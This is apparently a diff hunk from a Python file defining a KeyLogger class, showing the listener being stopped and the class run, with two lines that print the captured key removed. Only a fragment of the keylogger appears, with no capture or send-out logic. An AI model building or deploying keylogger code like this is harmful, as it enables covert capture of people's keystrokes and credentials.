@@ -67,5 +67,3 @@ class KeyLogger():
             keyboard_listener.stop()
 keylogger = KeyLogger()
 keylogger.run()
-lista = keylogger.current_key
-print(lista)
